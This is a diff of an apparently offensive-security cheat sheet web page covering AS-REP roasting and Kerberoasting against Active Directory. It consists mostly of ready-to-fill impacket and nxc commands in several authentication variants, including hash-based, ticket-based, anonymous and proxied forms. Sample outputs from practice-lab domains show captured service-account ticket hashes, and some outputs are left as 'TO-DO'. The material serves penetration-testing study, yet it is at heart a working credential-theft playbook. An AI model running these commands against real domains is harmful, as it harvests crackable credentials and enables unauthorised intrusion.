-</span></span></div></pre></div></div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple valid usernames
+</span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple users
 </span></span><span class="line"><span class="cl"><span class="go">nxc ldap <span class="o editable-keyword">&lt;DC&gt;</span> -u <span class="o editable-keyword">&lt;USERS&gt;</span> -p '' --asreproast as_rep_hashes.txt
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> nxc ldap 10.10.11.181 -u valid_usernames.txt -p <span class="s1">''</span> --asreproast as_rep_hashes.txt
 </span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.11.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
 </span></span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:5a082acfc8 ---[SNIP]--- 06ddb9be16
 </span></span></span></div></pre></div></div></div>
+</div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">TO-DO
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
 
 <p></p>
 <hr>
-<h3 id="kerberoasting-from-linux">Kerberoasting (From Linux)</h3>
+<h3 id="kerberoasting">Kerberoasting</h3>
 <p class="tabs">
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Impacket</button>
+<button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>
 
-<button data-tabset="set2" data-tabcontent="tab2">nxc</button>
+<button data-tabset="set3" data-tabcontent="tab2">Windows</button>
 
-</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
+</p><div class="tabset-wrapper" data-tabset-group="set3"><div class="tabcontent active" data-tabset="set3" data-tabcontent="tab1"><p class="tabs"><button data-tabset="set3-1" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set3-1" data-tabcontent="tab2">nxc</button></p>
+<div class="tabset-wrapper" data-tabset-group="set3-1"><div class="tabcontent active" data-tabset="set3-1" data-tabcontent="tab1"><div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -request '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -request '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -no-pass -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span>
+TO-DO</div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -request '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes :<span class="o editable-keyword">&lt;HASH&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC1.scrm.local <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -request <span class="s1">'scrm.local/ksimpson:ksimpson'</span> -k -dc-host DC1.scrm.local
-</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
-</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
-</span></span></span><span class="line"><span class="cl"><span class="go">ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
-</span></span></span><span class="line"><span class="cl"><span class="go">----------------------------  ------  --------  --------------------------  --------------------------  ----------
-</span></span></span><span class="line"><span class="cl"><span class="go">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
-</span></span></span><span class="line"><span class="cl"><span class="go">MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
-</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc*<span class="nv">$b62984d5b</span> ---<span class="o">[</span>SNIP<span class="o">]</span>--- f4c2161493
-</span></span></div></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Anonymous
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -no-preauth <span class="o editable-keyword">&lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt;</span> -usersfile <span class="o editable-keyword">&lt;USERS&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> <span class="o editable-keyword">&lt;DOMAIN&gt;</span>/
+TO-DO</div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -request '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>:<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -request '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes :<span class="o editable-keyword">&lt;HASH&gt;</span> -k -dc-host <span class="o editable-keyword">&lt;DC&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs -request '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -k -no-pass -dc-host <span class="o editable-keyword">&lt;DC&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="anonymous-kerberoasting">Anonymous Kerberoasting</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; impacket-GetUserSPNs '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/' -usersfile <span class="o editable-keyword">&lt;USERS&gt;</span> -no-preauth <span class="o editable-keyword">&lt;USER_WITH_NO_PREAUTH&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> 
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -no-preauth jjones -usersfile valid_usernames.txt -dc-host 10.10.11.231 rebound.htb/
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
@@ -241,29 +642,29 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5tgs<span class="nv">$18$krbtgt$REBOUND</span>.HTB<span class="nv">$*</span>krbtgt*<span class="nv">$d989a5d49</span> ---<span class="o">[</span>SNIP<span class="o">]</span>--- 962d2aa2f2
 </span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
-</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --kerberoasting kerberoast_hashes.txt
+</span></span></span></div></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p></div><div class="tabcontent" data-tabset="set3-1" data-tabcontent="tab2"><div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s <span class="o editable-keyword">&lt;DC_IP&gt;</span> &amp;&amp; nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --kerberoasting kerberoast_hashes.txt
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC1.scrm.local <span class="o">&amp;&amp;</span> nxc ldap 10.10.11.168 -u ksimpson -p <span class="s1">'ksimpson'</span> -k --kerberoasting kerberoast_hashes.txt
-</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.11.168    389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
-</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   [+] scrm.local\ksimpson 
-</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   Bypassing disabled account krbtgt 
-</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   [*] Total of records returned 2
-</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   sAMAccountName: sqlsvc memberOf:  pwdLastSet: 2021-11-04 00:32:02.351452 lastLogon:2024-09-24 15:53:26.496449
-</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$335aeba3b ---[SNIP]--- 9718487474
-</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Socks5
-</span></span><span class="line"><span class="cl"><span class="go">proxychains4 -q nxc ldap <span class="o editable-keyword">&lt;DC_IP&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k --kerberoasting kerberoast_hashes.txt --dns-tcp --dns-server <span class="o editable-keyword">&lt;DC_IP&gt;</span>
